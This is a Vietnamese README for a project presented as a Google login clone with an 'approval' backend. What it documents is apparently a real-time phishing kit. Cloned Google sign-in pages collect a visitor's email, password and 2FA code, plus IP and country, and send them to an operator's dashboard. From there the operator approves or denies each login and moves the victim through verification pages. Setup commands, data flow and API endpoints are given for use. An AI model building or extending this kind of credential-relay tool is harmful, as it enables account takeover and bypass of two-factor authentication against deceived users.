# Google Login Clone với Hệ thống Approval

Đây là một clone của trang đăng nhập Google với hệ thống approval backend để kiểm soát quá trình đăng nhập.

## Cấu trúc dự án

```
google-login-clone/
├── index.html              # Trang đăng nhập chính
├── password.html           # Trang nhập mật khẩu
├── verify.html             # Trang nhập mã 2FA
├── verify-options.html     # Trang chọn phương thức xác thực
├── verify-device.html      # Trang thiết lập thiết bị
├── verify-notification.html # Trang chờ thông báo
├── script.js               # JavaScript cho trang đăng nhập
├── password.js             # JavaScript cho trang mật khẩu
├── verify.js               # JavaScript cho trang 2FA
├── styles.css              # CSS chung
└── server.js               # Server frontend (port 8000)

GUI Local/
├── gui.html                # Giao diện quản lý approval
├── server.js               # Server backend (port 5000)
└── package.json            # Dependencies
```

## Cách sử dụng

### 1. Khởi động Backend (GUI Local)

```bash
cd "GUI Local"
npm install
node server.js
```

Backend sẽ chạy tại `http://localhost:5000`

### 2. Khởi động Frontend

```bash
cd google-login-clone
node server.js
```

Frontend sẽ chạy tại `http://localhost:8000`

### 3. Quy trình hoạt động

1. **Người dùng truy cập**: `http://localhost:8000`
2. **Nhập email**: Dữ liệu được gửi đến Backend
3. **Backend hiển thị**: Trong GUI Local tại `http://localhost:5000`
4. **Admin approve/deny**: Trong GUI Local
5. **Frontend nhận response**: Chuyển trang hoặc hiển thị lỗi

### 4. Luồng dữ liệu

#### Frontend → Backend
- **API**: `POST /api/request`
- **Dữ liệu**: email, password, twofa, userAgent, currentPage
- **Response**: requestId

#### Backend → Frontend
- **API**: `GET /api/status/:id`
- **Dữ liệu**: status (pending/approved/denied), pageStatus
- **Polling**: Mỗi 5 giây

#### Cập nhật trạng thái trang
- **API**: `POST /api/update-page`
- **Dữ liệu**: id, currentPage

### 5. Các trạng thái

- **pending**: Chờ approval
- **approved**: Được phê duyệt
- **denied**: Bị từ chối
- **finished**: Hoàn thành

### 6. Các trang

- **index.html**: Login
- **password.html**: Password
- **verify-device.html**: Setup Code Phone
- **verify-options.html**: Wait Options
- **verify.html**: 2FA
- **verify-notification.html**: Waiting Finish

## Tính năng

### Frontend
- ✅ Gửi dữ liệu đăng nhập đến Backend
- ✅ Kiểm tra trạng thái approval mỗi 5 giây
- ✅ Hiển thị thông báo lỗi khi bị từ chối
- ✅ Chuyển trang tự động khi được approve
- ✅ Fallback khi Backend không khả dụng
- ✅ Cập nhật trạng thái trang

### Backend
- ✅ Nhận dữ liệu từ Frontend
- ✅ Lưu trữ danh sách requests
- ✅ API approve/deny requests
- ✅ API kiểm tra trạng thái
- ✅ GUI quản lý requests
- ✅ Lấy thông tin IP và country

## Troubleshooting

### Frontend không kết nối được Backend
- Kiểm tra Backend có đang chạy không
- Kiểm tra port 5000 có bị block không
- Frontend sẽ tự động fallback nếu không kết nối được

### Backend không nhận được dữ liệu
- Kiểm tra CORS settings
- Kiểm tra network connectivity
- Kiểm tra console logs

### GUI Local không hiển thị requests
- Refresh trang
- Kiểm tra console logs
- Kiểm tra API `/api/pending`

## API Endpoints

### Backend (Port 5000)

- `POST /api/request` - Gửi dữ liệu đăng nhập
- `GET /api/status/:id` - Kiểm tra trạng thái
- `POST /api/update-page` - Cập nhật trạng thái trang
- `POST /api/approve` - Phê duyệt request
- `POST /api/delete` - Xóa request
- `GET /api/pending` - Lấy danh sách requests

### Frontend (Port 8000)

- Tất cả các file HTML, CSS, JS được serve statically 